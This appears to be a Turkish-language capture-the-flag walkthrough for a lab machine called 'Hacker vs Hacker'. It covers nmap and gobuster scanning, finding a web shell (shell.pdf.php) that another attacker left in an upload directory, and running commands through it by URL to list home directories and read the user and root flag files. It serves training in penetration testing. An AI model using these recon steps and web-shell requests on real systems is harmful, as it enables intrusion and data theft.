<h1>HACKER vs HACKER - CTF WALKTHROUGH</h1>

============================================================================


<h1>Tarama</h1>
<br>
Bir makineye saldırı yapmadan önce, o makinenin açık olan servislerini ve portlarını öğrenmek gerekir. Bu, nereden başlayacağımızı anlamamızı sağlar. Portlar ve servisler hakkında bilgi almak için Nmap kullanıyoruz:

-sV: Servis versiyonlarını öğrenmek için  
-sC: Yaygın scriptleri çalıştırmak için kullanılır.

<pre>nmap -sC -sV 10.81.185.192</pre>

<img width="789" height="320" alt="image" src="https://github.com/user-attachments/assets/1c0cc8f7-a66e-4862-8ae0-074eb8d0c840" />
<br><br><br><br>

<h1>Web Servisine Erişim</h1>
<br>
Tarama sonucu web sunucusunun (port 80) açık olduğunu gördük. İlk adım olarak, web sitesine erişim sağlıyoruz:

<pre>http://10.81.185.192</pre>

<img width="1116" height="666" alt="image" src="https://github.com/user-attachments/assets/9a9fd6f7-1a80-4008-a954-b429dd1091df" />

Web sitesi "RecruitSec" adında bir güvenlik danışmanlığı firmasının sitesi gibi görünüyor. Sayfanın alt kısmında CV yükleme formu bulunuyor.

<br><br><br><br>

<h1>Sayfa Kaynağı İncelemesi</h1>
<br>
Web sayfalarında genellikle yorum satırları veya gizli bilgiler bırakılabilir. Sayfa kaynağına (Ctrl+U) bakarak, saldırıya veya ipuçlarına yarayacak herhangi bir bilgi var mı diye kontrol ediyoruz.

<img width="1216" height="793" alt="image" src="https://github.com/user-attachments/assets/849bb531-5c5f-45a7-adb9-15b147b947a8" />

Sayfa kaynağında kritik bir yorum bulduk:

<pre>&lt;!-- im no security expert - thats what we have a stable of nerds for - but isn't /cvs on the public website a privacy risk? --&gt;</pre>

Bu yorum bize `/cvs` dizininin public olarak erişilebilir olduğunu ve potansiyel bir güvenlik riski oluşturduğunu gösteriyor.

<br><br><br><br>

<h1>Gizli Dosya ve Dizinleri Bulma</h1>
<br>
Web sunucusunda, normalde erişim sağlanmayan veya gizli olan dizin ve dosyalar olabilir. Bunlar bazen önemli bilgiler içerebilir. Bunun için Gobuster ile dizin taraması yapıyoruz:

<pre>gobuster dir --no-error -u http://10.81.185.192/cvs -w /usr/share/dirb/wordlists/common.txt -x .pdf.php</pre>

<img width="821" height="476" alt="image" src="https://github.com/user-attachments/assets/eca6f9ea-4299-4517-8e70-0c60b237cc5e" />

Bulunan kritik dosya:

/cvs/shell.pdf.php → Başka bir hacker tarafından yüklenmiş web shell

<br><br><br><br>

<h1>Hacker Shell'ini Keşfetme</h1>
<br>
Dizin taraması sonucunda başka bir hacker'ın yüklediği shell keşfedildi. Bu shell’e erişim sağladık:

<pre>http://10.81.185.192/cvs/shell.pdf.php?cmd=whoami</pre>

<img width="1036" height="552" alt="image" src="https://github.com/user-attachments/assets/2c983a24-4ba4-45ee-b3d5-8be359a73bf0" />

Çıktı: www-data

Shell aktif ve komut çalıştırabiliyoruz.

<br><br><br><br>

<h1>Sistem Keşfi</h1>
<br>
Web shell üzerinden sistem keşfi yapıyoruz:

<pre>http://10.81.185.192/cvs/shell.pdf.php?cmd=ls+/home</pre>

Kullanıcının `user.txt` dosyasını okuma:
<pre>http://10.81.185.192/cvs/shell.pdf.php?cmd=cat+/home/[BULUNAN_KULLANICI]/user.txt</pre>

Root dizinindeki `proof.txt` dosyasını okuma:
<pre>http://10.81.185.192/cvs/shell.pdf.php?cmd=cat+/root/proof.txt</pre>

<img width="676" height="374" alt="image" src="https://github.com/user-attachments/assets/450af6d7-5b45-42fe-96c3-50085bf6eb0b" />
